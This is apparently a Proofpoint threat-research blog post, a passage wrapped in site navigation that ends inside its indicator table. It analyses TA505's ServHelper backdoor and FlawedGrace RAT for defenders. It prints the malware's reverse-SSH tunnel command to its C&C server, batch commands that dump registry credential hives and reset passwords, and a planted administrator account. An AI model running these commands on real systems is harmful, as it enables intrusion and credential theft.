                                                              <div class="header-nav__content-link-desc">Stand out and make a difference at one of the world&#039;s leading cybersecurity companies.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/newsroom" class="header-nav__content-link-text">News Center</a>
                                                              <div class="header-nav__content-link-desc">Read the latest press releases, news stories and media highlights about Proofpoint.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/legal/trust" class="header-nav__content-link-text">Privacy and Trust</a>
                                                              <div class="header-nav__content-link-desc">Learn about how we handle data and make commitments to privacy and other regulations.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/legal/esg" class="header-nav__content-link-text">Environmental, Social, and Governance</a>
                                                              <div class="header-nav__content-link-desc">Learn how we apply our principles to positively impact our community.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/support-services" class="header-nav__content-link-text">Support</a>
                                                              <div class="header-nav__content-link-desc">Access the full range of Proofpoint support services.</div>
                                      </div>
              																				</div>
			</div>
					<div class="header-nav__menu-pane" data-content="platform_panel">
				<div class="header-nav__content">
											 <h3 class="header-nav__content-title">Platform</h3> 						 <div class="header-nav__content-heading">Discover the Proofpoint human-centric platform.</div> 													

  


  <a href=/us/platform class="global-elements__cta-button header-nav__content-button" >
    <span>Learn More</span>
    <div class="global-elements__cta-button--arrow-wrapper"></div>
  </a>


																											                                <div class="header-nav__content-link">
                                          <a href="/us/platform/nexus" class="header-nav__content-link-text">Nexus</a>
                                                              <div class="header-nav__content-link-desc">Detection technologies to protect people and defend data.</div>
                                      </div>
              						                                <div class="header-nav__content-link">
                                          <a href="/us/platform/zen" class="header-nav__content-link-text">Zen</a>
                                                              <div class="header-nav__content-link-desc">Protect and engage users wherever they work.</div>
                                      </div>
              																				</div>
			</div>
				<div class="header-nav__menu-pane" data-content="x_sch">
			<div class="header-nav__content">
				<div class="header-nav__content-title--search">
					Search Proofpoint
				</div>
				<div class="header-nav__search">

					<form class="header-nav__search-form">
						<input type="text" class="header-nav__search-input" placeholder="">
						<input type="submit" class="header-nav__search-button" val="Search">
					</form>
					<div class="header-nav__search-sugg-title">Try searching for</div>
					<div class="header-nav__search-suggestions">
													<a href="/us/search?content%5Bquery%5D=Email%20Security" class="header-nav__search-suggestion">Email Security</a>
													<a href="/us/search?content%5Bquery%5D=Phishing" class="header-nav__search-suggestion">Phishing</a>
													<a href="/us/search?content%5Bquery%5D=DLP" class="header-nav__search-suggestion">DLP</a>
													<a href="/us/search?content%5Bquery%5D=Email%20Fraud" class="header-nav__search-suggestion">Email Fraud</a>
											</div>
				</div>
			</div>
		</div>
		<div class="header-nav__menu-pane" data-content="x_lgn">
			<div class="header-nav__content">
				<div class="header-nav__content-title">
					Select Product Login
				</div>
				<ul class="header-nav__logins">
											<li class="header-nav__content-login">
							<a href="https://proofpoint.my.site.com/community/s/" target="_blank">Support Log-in</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://proofpointcybersecurityacademy.adobelearningmanager.com" target="_blank">Proofpoint Cybersecurity Academy</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://digitalrisk.proofpoint.com/" target="_blank">Digital Risk Portal</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://emaildefense.proofpoint.com/login.php" target="_blank">Email Fraud Defense</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://threatintel.proofpoint.com/" target="_blank">ET Intelligence</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://us1.proofpointessentials.com/app/login.php" target="_blank">Proofpoint Essentials</a>
						</li>
											<li class="header-nav__content-login">
							<a href="https://proofpointcommunities.force.com/community" target="_blank">Sendmail Support Log-in</a>
						</li>
									</ul>
			</div>
		</div>
		<div class="header-nav__menu-pane" data-content="x_lng">
			<div class="header-nav__content">
				<div class="header-nav__content-title">
					Select Language
				</div>

				<ul class="header-nav__language-links">
                    <li class="header-nav__language-link">
            <a href="/us">English (Americas)</a>
          </li>
          					            					                          <li class="header-nav__language-link">
                <a href="/uk">English (Europe, Middle East, Africa)</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/au">English (Asia-Pacific)</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/es">Español</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/de">Deutsch</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/fr">Français</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/it">Italiano</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/br">Português</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/jp">日本語</a>
              </li>
            					                          <li class="header-nav__language-link">
                <a href="/kr">한국어</a>
              </li>
            									</ul>
			</div>
		</div>
	</div>
</div>



<div class="layout-container">
  
    <div>
    <div data-drupal-messages-fallback class="hidden"></div>

  </div>


  <main class="container" role="main">
    <a id="main-content" tabindex="-1"></a>    <section class="row">
      <div class="layout-content">
          <div>
    <div id="block-particle-content">
  
    
      




<article about="/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" class="node--type--blog-post node--view-mode--full node node-blog-full _legacy_content _blog-full">
  



  <div class="breadcrumbs _legacy_element _breadcrumbs"><div class="nav-crumbs"><div class="breadcrumb__item"><a href="/us/blog" class="breadcrum__item-link">Blog</a></div><div class="breadcrumb__item"><a href="/us/blog/threat-insight" class="breadcrum__item-link">Threat Insight</a></div><div class="breadcrumb__item">
            ServHelper and FlawedGrace - New malware introduced by TA505          </div></div></div>

  <div class="blog-banner">
    <div class="blog-banner__image">      <picture>
                  <source srcset="/sites/default/files/styles/image_1920_750/public/images/Blog/server2.png.webp?itok=TSBE1hB8 1x" media="screen and (min-width: 1440px)" type="image/webp" width="1920" height="750"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/images/Blog/server2.png.webp?itok=SkoB18QQ 1x" media="screen and (min-width: 1024px)" type="image/webp" width="1024" height="400"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/images/Blog/server2.png.webp?itok=GKPZilUm 1x" media="screen and (min-width: 768px)" type="image/webp" width="768" height="375"/>
              <source srcset="/sites/default/files/styles/image_1920_750/public/images/Blog/server2.png.webp?itok=TSBE1hB8 1x" media="screen and (min-width: 1440px)" type="image/webp" width="1920" height="750"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/images/Blog/server2.png.webp?itok=SkoB18QQ 1x" media="screen and (min-width: 1024px)" type="image/webp" width="1024" height="400"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/images/Blog/server2.png.webp?itok=GKPZilUm 1x" media="screen and (min-width: 768px)" type="image/webp" width="768" height="375"/>
                  <img loading="lazy" src="/sites/default/files/styles/image_768_300/public/images/Blog/server2.png.webp?itok=SBKt6te-" width="768" height="300" alt="New malware introduced by TA505" typeof="foaf:Image" />

  </picture>


</div>
    <div class="blog-banner__gradient-overlay"></div>
    <div class="blog-banner__heading-wrap">
      
      


<h1 class="blog-banner__heading">
      <span>ServHelper and FlawedGrace - New malware introduced by TA505</span>

  </h1>

    </div>
  </div>

  <div class="blog-content">
    <div class="blog-content__sharethis sharethis_toolbox sharethis_32x32_style">
      <div class="blog-content__sharethis_label sharethis__label">Share with your network!</div>
      <div class="blog-content__sharethis_buttons sharethis_buttons">
        <div class="sharethis-inline-share-buttons"></div>
        
<span class="addthis_button_subscribe at300b UNCONVERTED" title=Subscribe>
  <span class="at-icon-wrapper block-subscribe-button__trigger block-subscribe-button__addthis"></span>
</span>


      </div>
    </div>
        <div class="blog-content__metadata blog-content__metadata-author">
      <span class="blog-content__date">  <time datetime="2019-01-09T17:00:00Z">January 09, 2019</time>

</span>
        <span class="blog-content__author">
                Dennis Schwarz and Proofpoint Staff
  
        </span>
    </div>
    <div class="node-full__body blog-content__body">  <p><strong>Overview</strong></p>

<p>For much of 2018, we observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access Trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, <u><a href="https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times">TA505</a></u>, a prolific actor that has been at the forefront of this trend, began distributing&nbsp; a new backdoor we named “ServHelper”. ServHelper has two variants: one focused on remote desktop functions and a second that primarily functions as a downloader. Additionally we have observed the downloader variant download a malware we call “FlawedGrace.” FlawedGrace is a full-featured RAT that we first observed in November 2017. TA505 appears to be actively targeting banks, retail businesses, and restaurants as they distribute these malware families. This targeting falls in line with other activity we reported earlier in 2018.[1] [2]</p>

<p><strong>Campaign Analysis</strong></p>

<p><em>November 9 “Tunnel” Campaign</em></p>

<p>On November 9, 2018, we observed a relatively small email campaign (thousands of messages) delivering a new malware family that we call “ServHelper” based on file names associated with infection. The campaign primarily targeted financial institutions and was attributed to the threat actor TA505. The messages (Figure 1) contained Microsoft Word or Publisher attachments with macros that, when enabled, downloaded and executed the malware. This campaign used the “tunnel” variant of ServHelper, described in the “Malware Analysis” section.</p>

<p><img alt="Email message from November 9 “tunnel” campaign" src="/sites/default/files/fgf1.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 1: Example email message from the November 9 “tunnel” campaign</em></p>

<p><em>November 15 “Downloader” Campaign</em></p>

<p>On November 15, 2018, we saw a similar, but larger campaign (tens of thousands of messages) from the same actor. In addition to financial institutions, this campaign also targeted the retail industry. The messages (Figure 2) contained Microsoft “.doc”, “.pub”, or “.wiz” attachments. The documents contained macros that, when enabled, downloaded and executed the ServHelper malware. This campaign used the “downloader” variant of ServHelper with the tunneling functionality removed.</p>

<p><img alt="Email message from November 15 “downloader” campaign" src="/sites/default/files/fgf2.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 2: Example email message from the November 15 “downloader” campaign</em></p>

<p><em>December 13 “FlawedGrace” Campaign</em></p>

<p>On December 13, 2018, we observed another large ServHelper “downloader” campaign targeting retail and financial services customers. The messages used a mixture of Microsoft Word attachments with embedded malicious macros, PDF attachments with URLs linking to a fake “Adobe PDF Plugin” webpage linking to the malware (Figure 3), and direct URLs in the email body linking to a ServHelper executable.</p>

<p><img alt="PDF attachment containing URL linking to fake “Adobe PDF Plugin” page" src="/sites/default/files/fgf3.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 3: Example PDF attachment containing a URL linking to the fake </em>“Adobe PDF Plugin” page</p>

<p>In this campaign, we observed ServHelper download (Figure 4) and execute an additional malware that we call “FlawedGrace.” FlawedGrace is a robust remote access trojan (RAT) that we initially encountered in November 2017, but have rarely observed since.</p>

<p><img alt="Fiddler screenshot showing ServHelper downloading FlawedGrace" src="/sites/default/files/fgf4.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 4: Fiddler screenshot showing ServHelper downloading FlawedGrace</em></p>

<p><strong>ServHelper Malware Analysis</strong></p>

<p>ServHelper is a new malware family -- best classified as a backdoor -- that we first observed in the wild in November 2018. Its name is based on a filename (ServHelper.dll) that we noted in the November 9 “tunnel” campaign described above. A sample from a later campaign used command and control (C&amp;C) URIs containing “/rest/serv.php” which also reference a “serv” component.</p>

<p>The malware is written in Delphi and at the time of this writing is being actively developed. New commands and functionality are being added to the malware in almost every new campaign so we will not focus on one specific sample for this analysis. Rather, we will discuss the malware family generally; see the “Indicators of Compromise” section below for specific reference samples.</p>

<p>As noted, there are two distinct variants of ServHelper: a “tunnel” variant and a “downloader” variant. The “tunnel” variant has more features and focuses on setting up reverse SSH tunnels to allow the threat actor to access the infected host via Remote Desktop Protocol (RDP). Once ServHelper establishes remote desktop access, the malware contains functionality for the threat actor to “hijack” legitimate user accounts or their web browser profiles and use them as they see fit. The “downloader” variant is stripped of the tunneling and hijacking functionality and is used as a basic downloader.</p>

<p>Both variants of ServHelper use the same HTTP C&amp;C protocol on port 443 (HTTPS) and, less frequently, port 80 (HTTP). An example of the initial phone home to the C&amp;C server is shown in Figure 5.</p>

<p><img alt="Example of ServHelper’s initial phone home" src="/sites/default/files/fgf5.png"></p>

<p><em>Figure 5: Example of ServHelper’s initial phone home</em></p>

<p>Early versions of the malware used a semi-random URI such as: “/ghuae/huadh.php”. Newer versions have started using more typical URIs such as:</p>

<ul>
	<li>/support/form.php</li>
	<li>/rest/serv.php</li>
	<li>/sav/s.php</li>
</ul>

<p>Most of the C&amp;C domains that we have observed have been in the “.pw” top-level domain (TLD) such as:</p>

<ul>
	<li>checksolutions[.]pw</li>
	<li>afgdhjkrm[.]pw</li>
	<li>pointsoft[.]pw</li>
	<li>dedoshop[.]pw</li>
</ul>

<p>However, recently the developer has added support for “.bit” C&amp;C domains; this TLD is associated with the cryptocurrency Namecoin and requires special DNS servers that the malware uses:</p>

<ul>
	<li>dedsolutions[.]bit</li>
	<li>arepos[.]bit</li>
</ul>

<p>The POST data in these C&amp;C communications contains three URL-encoded parameters: “key”, “sysid”, and “resp”. The “key” parameter is a hardcoded string in the malware that does not appear to be used elsewhere in the code. Examples of observed keys include:</p>

<ul>
	<li>Gsiss744@sd</li>
	<li>asdgdgYss455</li>
	<li>#567sisGdsa</li>
</ul>

<p>The “sysid” parameter contains a campaign ID in newer versions of the malware, the Windows version running on the infected machine, system architecture, username, and a random integer. Examples of observed campaign IDs include:</p>

<ul>
	<li>clean12</li>
	<li>chistka12.17</li>
	<li>noP_19</li>
	<li>nonRDP</li>
	<li>no24</li>
	<li>ny_upd</li>
</ul>

<p>The “resp” parameter contains responses to commands received from the controller.</p>

<p>An example command sent from the C&amp;C server to the infected machine can be seen in the Fiddler screenshot in Figure 4 above. It contains a command, carrot (“^”) delimiter, and command arguments. We observed the following commands in the malware:</p>

<p><strong>nop</strong></p>

<p>Implements a keep-alive type of functionality. The infected machine responds to the C&amp;C server with a “nop ok” message.</p>

<p><strong>tun (“tunnel” variant only)</strong></p>

<p>Sets up a reverse SSH tunnel connecting the C&amp;C server to the infected system’s RDP port (3389). In earlier versions, a loader component performed the initial setup for this and other commands by:</p>

<ul>
	<li>Extracting and dropping an OpenSSH binary from its PE resources</li>
	<li>Extracting, dropping, and configuring the RDP Wrapper Library software from its PE resources</li>
	<li>Creating a new user “supportaccount” with a password of “<em>Ghar4f5”</em></li>
	<li>Adding this user to the “Remote Desktop Users” and “Administrators” groups</li>
</ul>

<p>In more recent versions, this functionality of the loader component was integrated into the core ServHelper code, using built-in Windows remote desktop support instead of a third-party software package. This command sets up a reverse SSH tunnel by executing the dropped OpenSSH binary with the following command line arguments:</p>

<p><em>-N -R &lt;remote port&gt;:localhost:3389 tunnel@&lt;C&amp;C server&gt;</em></p>

<p>Once configured, ServHelper sends a “tun ok\r\nport:&lt;remote port&gt; tun pid:&lt;SSH process id&gt;” to the C&amp;C server.</p>

<p><strong>slp</strong></p>

<p>Sets a sleep timeout.</p>

<p><strong>fox (“tunnel” variant only)</strong></p>

<p>Copies a Firefox web browser profile from one user to another. Earlier versions used the Windows “xcopy” command. Later versions download a self-extracting RAR file from the C&amp;C server (/cp/cp.exe) and decompress it using the password “123”. One of the files in this archive is a piece of software known as "Runtime's Shadow Copy" and it is used to copy the web browser profiles.</p>

<p><strong>chrome (“tunnel” variant only)</strong></p>

<p>Similar to the “fox” command but for Chrome web browser profiles.</p>

<p><strong>killtun (“tunnel” variant only)</strong></p>

<p>Kills an SSH tunnel process associated with a particular remote port. Once killed, it sends a “killtun ok” message to the C&amp;C server.</p>

<p><strong>tunlist (“tunnel” variant only)</strong></p>

<p>Gets a list of all active SSH tunnels and responds to the C&amp;C server with a message containing “active tun: &lt;remote port&gt;” entries for each active tunnel.</p>

<p><strong>killalltuns (“tunnel” variant only)</strong></p>

<p>Kills all SSH tunnel processes.</p>

<p><strong>shell</strong></p>

<p>Executes a shell command and sends the response to the C&amp;C server.</p>

<p><strong>load</strong></p>

<p>Downloads and runs an executable from a specified URL. Responds to the C&amp;C server with either “load no param ok” or “load param ok” depending if any command-line arguments were passed to the downloaded executable.</p>

<p><strong>socks (“tunnel” variant only)</strong></p>

<p>Similar to the “tun” command, but allows a reverse SSH tunnel to be built between the C&amp;C server to any server/port (as specified by the command argument) through the infected system. Once configured, a “socks ok\r\nport:&lt;remote port&gt; tun pid:&lt;SSH process id&gt;” message is sent to the C&amp;C server.</p>

<p><strong>selfkill</strong></p>

<p>Removes the malware from the infected machine.</p>

<p><strong>loaddll (“downloader” variant only)</strong></p>

<p>A newer command that has only been observed in the “downloader” variant. Similar to the “load” command, but for DLLs.</p>

<p><strong>bk (“tunnel” variant only)</strong></p>

<p>A newer command similar to the “tun” command. “bk” allows the reverse SSH tunnel to be set up using a C&amp;C specified remote host instead of the hardcoded C&amp;C server.</p>

<p><strong>hijack (“tunnel” variant only)</strong></p>

<p>A newer command that appears to hijack a user account with a known password (“123”). It does so by creating and scheduling a task “test” to run a batch file containing the following commands:</p>

<ul>
	<li>reg export hklm\sam c:\sam.reg</li>
	<li>reg export hklm\security c:\sec.reg</li>
	<li>net user &lt;command argument username&gt; 123</li>
</ul>

<p>It then schedules a task “test2” to run another batch file containing the following commands:</p>

<ul>
	<li>schtasks /delete /tn "test" /F</li>
	<li>reg import c:\sam.reg</li>
	<li>reg import c:\sec.reg</li>
	<li>schtasks /delete /tn "test2" /F</li>
</ul>

<p>Finally it runs the first scheduled task ands send a “ready! try to login with pass 123” message to the C&amp;C server.</p>

<p><strong>forcekill (“tunnel” variant only)</strong></p>

<p>A newer command that is similar to the “killalltuns” but uses the Windows “taskkill” command.</p>

<p><strong>sethijack (“tunnel” variant only)</strong></p>

<p>A newer command that controls an “alerting” mechanism. A separate program thread monitors user logons. When a legitimate user becomes active and the threat actor is connected to the infected system using the previously created “supportaccount” account, it runs the “chrome” and “fox” commands, copying the legitimate user’s web browser profiles to the “supportaccount” user. It then alerts the threat actor by sending message boxes containing “login detected, begin hijacking” and “profiles hijacked!” messages. These are sent by a “msg.exe” program contained in the “cp.exe” archive discussed in the “fox” command above.</p>

<p><strong>chromeport (“tunnel” variant only)</strong></p>

<p>A newer command that implements the same functionality as the “chrome” command.</p>

<p>During some of the ServHelper “downloader” campaigns, we observed commands (e.g., as shown in Figure 4 above) instructing the malware to download and execute another malware we call “FlawedGrace”.</p>

<p><strong>FlawedGrace Malware Analysis</strong></p>

<p>FlawedGrace is a remote access trojan (RAT) named after debugging artifacts (class names) left in the analyzed sample (see Figure 6).</p>

<p><img alt="“Grace” class names shown by IDA Pro" src="/sites/default/files/fgf6.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 6: “Grace” class names shown by IDA Pro</em></p>

<p>The malware is written in C++. It is a very large program and makes extensive use of object-oriented and multithreaded programming techniques. This makes reverse engineering and debugging the malware both difficult and time consuming. The coding style and techniques suggest that FlawedGrace was not written by the same developer as ServHelper.</p>

<p>We initially observed FlawedGrace in an email campaign as early as November 2017, but until the recent ServHelper campaigns, we had not observed it being actively distributed again. The malware usually contains a debug string including a “version number” and “build date” distinct from the PE compile timestamp, allowing searches of various malware repositories to find additional versions:</p>

<ul>
	<li>Unknown version number built at “Aug&nbsp; 7 2017 22:28:47”</li>
	<li>Version 2.0.7 built at “Oct 18 2017 04:18:39”</li>
	<li>Version 2.0.8 built at “Oct 26 2017 12:05:44”</li>
	<li>Version 2.0.9 built at “Nov&nbsp; 4 2017 22:28:10”</li>
	<li>Version 2.0.10 built at “Nov 20 2017 10:53:33”</li>
	<li>Version 2.0.11 built at “Dec 16 2017 08:02:46”</li>
</ul>

<p>Per the malware’s debug strings, significant development took place during the end of 2017. The ServHelper campaigns were distributing version 2.0.10 of the malware.</p>

<p>FlawedGrace creates, encrypts, and stores a configuration file containing the C&amp;C IPs and ports in a “&lt;hex digits&gt;.dat” file (e.g., “C:\ProgramData\21851a60.dat”). The first 16 bytes of the file are an AES initialization vector (IV). The rest of the data is AES-encrypted in CBC mode. In the analyzed sample, the AES key was hardcoded as “c3oeCSIfx0J6UtcV”. Once decrypted, the configuration data is stored as a custom serialization (Figure 7). Early versions of the malware used the class names “GraceParams” and “GraceValue” when interacting with this part of the code, so it is likely that the serialization was designed and developed by the malware developer and not a standard format.</p>

<p><img alt="Plaintext configuration file showing C&amp;C IP and port" src="/sites/default/files/fgf7.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 7: Plaintext configuration file showing C&amp;C IP and port</em></p>

<p>FlawedGrace uses a complicated binary protocol for its command and control. It can use a configurable port for communications, but all samples we have observed to date have used port 443. Figure 8 shows an example of the first four messages between an infected system and C&amp;C server.</p>

<p><img alt="FlawedGrace’s initial C&amp;C communications" src="/sites/default/files/fgf8.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 8: FlawedGrace’s initial C&amp;C communications.</em></p>

<p>We are still reverse engineering and documenting the protocol, but we can provide an overview of the initial C&amp;C communications below:</p>

<p><strong>Message 1</strong></p>

<p>Initial beacon from infected system. It is a 14-byte binary structure that contains at least the following parts:</p>

<ul>
	<li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x4: magic bytes "GCRG" (DWORD)</li>
</ul>

<p><strong>Message 2</strong></p>

<p>Key verification message from infected system. We believe that this is used to verify that one of the encryption keys (static key) is the same on both the malware and C&amp;C server. It is a 52-byte binary structure that contains the following analyzed offsets, among other components still under analysis:</p>

<ul>
	<li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x14: MD5 hash of the following pieces (16 bytes)
	<ul>
		<li>A static key which has always been “static pass” in the samples analyzed</li>
		<li>The random bytes at offset 0x24 that have been hex encoded and uppercased</li>
	</ul>
	</li>
	<li>Offset 0x24: random bytes (16 bytes)</li>
</ul>

<p><strong>Message 3</strong></p>

<p>Key exchange message from C&amp;C server. This message delivers a second encryption key (dynamic key) used for further data transfers. It is a 42-byte structure that contains the following analyzed offsets, among other components still under analysis:</p>

<ul>
	<li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x1a: dynamic key (16 bytes)</li>
</ul>

<p><strong>Message 4</strong></p>

<p>An example of data transfer between infected system and C&amp;C server. It starts with a 38-byte binary header that contains the following analyzed offsets, among other components still under analysis:</p>

<ul>
	<li>Offset 0x0: CRC32 hash of the next 10 bytes (DWORD)</li>
	<li>Offset 0xE: AES IV (16 bytes)</li>
</ul>

<p>Following the header is the data that has been AES-encrypted in CBC mode. The AES key is generated using the “static key” and the “dynamic key” from messages 3 and 4 above. An example of key generation in Python appears in Figure 9.</p>

<p><img alt="FlawedGrace C&amp;C data transfer encryption key generation in Python" src="/sites/default/files/fgf9.png" style="border-width: 0px; border-style: solid;"></p>

<p><em>Figure 9: Example FlawedGrace C&amp;C data transfer encryption key generation in Python</em></p>

<p>Figure 10 shows an example of the plaintext data transferred in message 4.</p>

<p><img alt="FlawedGrace C&amp;C message 4 plaintext data example" src="/sites/default/files/fgf10.png"></p>

<p><em>Figure 10: Example FlawedGrace C&amp;C message 4 plaintext data</em></p>

<p>This message contains various system and malware information that has been serialized using the same method as for configuration files. The serialized data is then packaged within additional binary data structures.</p>

<p>While there are other message types with their own formats, the examples here provide initial insight into FlawedGrace’s C&amp;C protocol.</p>

<p>FlawedGrace also uses a series of commands, provided below for reference:</p>

<ul>
	<li>target_remove</li>
	<li>target_update</li>
	<li>target_reboot</li>
	<li>target_module_load</li>
	<li>target_module_load_external</li>
	<li>target_module_unload</li>
	<li>target_download</li>
	<li>target_upload</li>
	<li>target_rdp</li>
	<li>target_passwords</li>
	<li>target_servers</li>
	<li>target_script</li>
	<li>destroy_os</li>
	<li>desktop_stat</li>
</ul>

<p><strong>Conclusion</strong></p>

<p>Threat actor TA505 is both consistent and prolific. When the group distributes new malware, it may be a blip (like Bart ransomware, which was only distributed for one day in 2016) or like Locky ransomware it may become the dominant strain of malware in the wild. In this case, the group has started distributing two variants on a new backdoor we named ServHelper and a RAT we call FlawedGrace. This also extends the trend that emerged in 2018, in which threat actors increasingly focused on distribution of downloaders, information stealers, RATS, and other malware that can remain resident on victim devices for far longer than destructive, “smash and grab” malware like ransomware. We will continue to observe the distribution of these three malware variants but, at this time, they do not appear to be one-offs, but rather long-term investments by TA505.</p>

<p><strong>References</strong></p>

<p>[1]&nbsp;<a href="https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments">https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments</a></p>

<p>[2] <u><a href="https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware">https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware</a></u></p>

<p>&nbsp;</p>

<p><strong>Indicators of Compromise (IOCs)</strong></p>

<table border="1" cellpadding="0" cellspacing="0" width="624">
	<tbody>
		<tr>
			<td style="width:382px;">
			<p><strong>IOC</strong></p>
			</td>
			<td style="width:88px;">
			<p><strong>IOC Type</strong></p>
			</td>
			<td style="width:154px;">
			<p><strong>Description</strong></p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>52c72a9de2f6e892f07827add85ad913b0541cd5c8449aadc2722f8eb75e548c</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign attachment</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://officemysuppbox[.]com/staterepository</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign payload</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>1b0859ddbdebcb9d2bb46de00d73aa21bc617614b8123054426556783b211bc8</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxps://checksolutions[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxps://rgoianrdfa[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxps://arhidsfderm[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:88px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:154px;">
			<p>&nbsp;</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>eb66ebb95a3dcecae64c61f611a9332fbf460d1b8039d3ab7e4f220104a4bec4</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign attachment</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://offficebox[.]com/host32</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign payload</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>3cd7e0a8321259e8446b2a9da775aae674715c74ff4923cfc8ec5102f380d41a</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign ServHelper</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:88px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:154px;">
			<p>&nbsp;</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>f4b9219f329803dd45afd5646351de456e608dd946830c961ec66c6c25e52cac</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign attachment</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxp://office365onlinehome[.]com/host32</p>

			<p>&nbsp;</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign payload</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>d56429d6d0222022fe8f4cb35a28cd4fb83f87b666a186eb54d9785f01bb4b58</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign ServHelper</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>hxxps://afgdhjkrm[.]pw/aggdst/Hasrt.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace”&nbsp; campaign ServHelper C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>efcee275d23b6e71589452b1cb3095ff92b10ab68cd07957b2ad6be587647b74</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign FlawedGrace</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>46.161.27[.]241:443</p>
			</td>
			<td style="width:88px;">
			<p>IP:Port</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign FlawedGrace C&amp;C</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:88px;">
			<p>&nbsp;</p>
			</td>
			<td style="width:154px;">
			<p>&nbsp;</p>
			</td>
		</tr>
		<tr>
			<td style="width:382px;">
